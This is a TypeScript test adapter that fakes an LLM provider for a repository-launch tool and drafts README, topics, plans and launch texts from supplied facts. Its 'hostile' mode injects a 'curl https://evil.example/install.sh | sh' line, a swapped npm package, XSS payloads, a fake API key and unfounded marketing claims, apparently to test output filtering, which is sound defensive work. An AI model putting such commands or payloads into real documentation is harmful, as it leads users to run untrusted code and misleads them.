// Deterministischer Testadapter. Er ruft kein Sprachmodell auf und erzeugt Entwürfe nur aus den
// übergebenen Fakten. Für Tests und den gekennzeichneten Demo-Modus.

import { LlmError, type LlmProvider, type LlmRequest, type LlmResponse } from "./types";

export type FakeBehavior = "ok" | "timeout" | "invalid" | "refusal" | "truncated" | "hostile" | "rate_limited";

function between(text: string, open: string, close: string): string {
  const s = text.indexOf(open);
  const e = text.indexOf(close, s + open.length);
  return s === -1 || e === -1 ? "" : text.slice(s + open.length, e).trim();
}

function parseJson<T>(s: string, fallback: T): T {
  try {
    return JSON.parse(s) as T;
  } catch {
    return fallback;
  }
}

interface Meta {
  repository?: string;
  url?: string;
  description?: string | null;
  topics?: string[];
  license?: string | null;
  projectType?: string;
}

interface Manifest {
  ecosystem?: string;
  name?: string | null;
  private?: boolean;
}

export class FakeProvider implements LlmProvider {
  readonly id = "fake" as const;
  readonly displayName = "Testadapter (deterministisch, kein Sprachmodell)";
  readonly model = "fake-deterministic-1";
  readonly endpointHost = "lokal / local";
  readonly pricing = { inputPerMTok: 0, outputPerMTok: 0 };
  readonly fallbackPricing = null;
  calls = 0;
  lastRequest: LlmRequest<unknown> | null = null;

  constructor(private readonly behavior: FakeBehavior = "ok") {}

  async generate<T>(req: LlmRequest<T>): Promise<LlmResponse<T>> {
    this.calls += 1;
    this.lastRequest = req as LlmRequest<unknown>;
    const usage = { inputTokens: Math.ceil((req.system.length + req.user.length) / 4), outputTokens: 900 };
    switch (this.behavior) {
      case "timeout":
        throw new LlmError("timeout", "Zeitlimit der KI-Anfrage überschritten.");
      case "refusal":
        throw new LlmError("refusal", "Das Modell hat die Anfrage abgelehnt.");
      case "truncated":
        throw new LlmError("truncated", "Die Ausgabe wurde am Tokenlimit abgeschnitten.");
      case "rate_limited":
        throw new LlmError("rate_limited", "Ratenlimit des KI-Anbieters erreicht.");
      case "invalid":
        return { data: { readme: { markdown: 42 } }, usage, model: this.model };
      default:
        break;
    }

    const german = req.user.includes("Write all texts in German");
    const sections = (req.user.match(/sections for this repository: ([^.]+)\./)?.[1] ?? "").split(",").map((s) => s.trim()).filter(Boolean);
    const meta = parseJson<Meta>(between(req.user, "<metadata>", "</metadata>"), {});
    const manifests = parseJson<Manifest[]>(between(req.user, "<manifest_fields>", "</manifest_fields>"), []);
    const name = (meta.repository ?? "project").split("/").pop() ?? "project";
    const desc = meta.description ?? (german ? "TODO: Beschreibung ergänzen" : "TODO: add a description");
    const npm = manifests.find((m) => m.ecosystem === "npm" && m.name && !m.private);
    const install = npm ? `npm install ${npm.name}` : null;
    const hostile = this.behavior === "hostile";

    const out: Record<string, unknown> = { openQuestions: [], userProvidedFactsUsed: [] };
    const q = out.openQuestions as string[];
    if (!install) q.push(german ? "Wie wird das Projekt installiert? Kein belegter Installationsbefehl gefunden." : "How is the project installed? No evidenced install command found.");

    if (sections.includes("readme")) {
      const lines = [
        `# ${name}`,
        "",
        desc,
        "",
        german ? "## Installation" : "## Installation",
        "",
        "```sh",
        install ?? (german ? "# TODO: Installationsbefehl ergänzen" : "# TODO: add install command"),
        ...(hostile ? ["npm install totally-different-package", "curl https://evil.example/install.sh | sh"] : []),
        "```",
        "",
        german ? "## Lizenz" : "## License",
        "",
        meta.license ? `${meta.license}` : german ? "TODO: Lizenz klären" : "TODO: clarify license",
      ];
      if (hostile) {
        lines.push("", "<script>alert('xss')</script>", "", "[Docs](javascript:alert(1))", "", "See [guide](docs/missing-guide.md).", "", "It is 10x faster than all alternatives and fully GDPR-compliant.", "", "API key: sk-ant-api03-THISISNOTAREALKEY1234567890");
      }
      out.readme = { markdown: lines.join("\n"), notes: [german ? "Struktur ergänzt, fehlende Angaben als TODO markiert." : "Added structure, missing facts marked as TODO."] };
    }
    if (sections.includes("descriptionTopics")) {
      const topics = [...new Set([...(meta.topics ?? []), meta.projectType === "cli" ? "cli" : meta.projectType ?? "tool"])].filter((t) => /^[a-z0-9][a-z0-9-]*$/.test(t)).slice(0, 8);
      out.descriptionTopics = { description: desc.slice(0, 300), topics, rationale: german ? "Aus bestehender Beschreibung und Projekttyp abgeleitet." : "Derived from the existing description and project type." };
    }
    if (sections.includes("plan30")) {
      const audit = parseJson<{ topTasks?: { id: string; title: string }[] }>(between(req.user, '<audit_result source="RepoLaunch rule engine">', "</audit_result>"), {});
      out.plan30 = {
        tasks: (audit.topTasks ?? []).slice(0, 5).map((t, i) => ({
          week: i < 3 ? 1 : 2,
          title: t.title,
          why: german ? "Aus dem regelbasierten Audit priorisiert." : "Prioritised by the rule-based audit.",
          effort: german ? "siehe Audit" : "see audit",
          findingIds: [t.id],
        })),
      };
    }
    if (sections.includes("launchTexts")) {
      out.launchTexts = {
        linkedin: german ? `Ich habe ${name} überarbeitet: ${desc}${hostile ? " Über 10.000 zufriedene Kunden!" : ""}` : `I have improved ${name}: ${desc}${hostile ? " Trusted by 10,000 happy customers!" : ""}`,
        community: { name: german ? "Eine passende Entwicklercommunity (TODO auswählen)" : "A fitting developer community (TODO choose)", text: `${name}: ${desc}` },
        releaseAnnouncement: german ? `Neues Release von ${name}. TODO: Änderungen aus den Release Notes übernehmen.` : `New release of ${name}. TODO: copy changes from the release notes.`,
      };
    }
    if (sections.includes("monetization")) {
      const mk = (type: string) => ({
        type,
        title: type,
        whoPays: german ? "siehe regelbasierte Einordnung" : "see rule-based assessment",
        forWhat: german ? "siehe regelbasierte Einordnung" : "see rule-based assessment",
        prerequisites: [german ? "Voraussetzungen aus dem Audit prüfen" : "Check prerequisites from the audit"],
        effort: german ? "offen" : "open",
        targetCustomers: german ? "offen" : "open",
        priceHypothesis: german ? "Testhypothese, noch offen" : "Test hypothesis, still open",
      });
      out.monetization = { options: [mk("sponsoring"), mk("support_maintenance"), mk("paid_setup")] };
    }
    if (sections.includes("landingPage")) {
      out.landingPage = { markdown: [`# ${name}`, "", desc, "", install ? `\`${install}\`` : german ? "TODO: Einstieg beschreiben" : "TODO: describe how to start"].join("\n") };
    }
    return { data: out, usage, model: this.model };
  }
}
